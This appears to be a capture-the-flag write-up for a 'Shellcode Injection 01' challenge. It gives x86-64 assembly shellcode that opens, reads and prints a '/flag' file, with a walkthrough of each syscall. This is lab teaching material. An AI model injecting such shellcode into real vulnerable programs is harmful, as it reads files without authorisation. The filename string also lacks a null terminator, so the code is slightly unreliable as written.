### Shellcode Injection 01

This challenge is an easy one. It can be solved as follow

1. Open flag file using sys_open syscall which returns the file descriptor and stores in rax.
2. Read the file descriptor from previous step using sys_read syscall and write the content to the stack
3. Write the content from the stack to stdout. 


```asm
.intel_syntax noprefix
.global _start

_start:
   mov rax, 0x02
   lea rdi, [rip+flag]
   mov rsi, 0x0
   mov rdx, 0x0
   syscall

   mov rdi, rax
   xor rax, rax
   mov rdx, 100
   mov rsi, rsp
   syscall

   mov rax, 0x01
   mov rdi, 0x01
   mov rsi, rsp
   mov rdx, 100
   syscall
   
flag:
   .ascii "/flag"
```

---------------------
In below code ,  first we mov the value 2 to rax, which refers to the sys_open syscall. It requires three parameters in following registers. The file descriptor of the open file is stored in the rax register after call to syscall. 

- rax: syscall number, 2 in our case
- rdi: filename, /flag in our case
- rsi: flags, 0 as we are just want to read the file
- rdx: mode, 0 as we are not setting any flags

```asm
   mov rax, 0x02
   lea rdi, [rip+flag]
   mov rsi, 0x0
   mov rdx, 0x0
   syscall
```
-----

In below code, we read the content of the file using the sys_read syscall. It requires following arguments

- rax: syscall number, 0 in our case. We are using xor to set the content to 0
- rdi: file descriptor, value stored in the rax from previous operation
- rsi: buffer pointer, we will set the pointer to the top of the stack using the rsp register.
- rdx: count, 100 as we want to read 100 bytes.


```asm
   mov rdi, rax
   xor rax, rax
   mov rdx, 100
   mov rsi, rsp
   syscall  
```
------

In below code, we write what we previously dumped onto the stack to stdout using the sys_write syscall. It requires the following arguments.

- rax: syscall number, 1 in our case
- rdi: file descriptor, 1 as we want to write to stdout
- rsi: buffer pointer, we will set the pointer to the top of the stack using the rsp register as there is where we had stored the content from the previous syscall.
- rdx: count, 100 as we want to read 100 bytes.

```asm
   mov rax, 0x01
   mov rdi, 0x01
   mov rsi, rsp
   mov rdx, 100
   syscall
```
-----
This says to the assembler that we wish to store the string "/flag" at label flag.

```asm
flag:
   .ascii "/flag"
``'`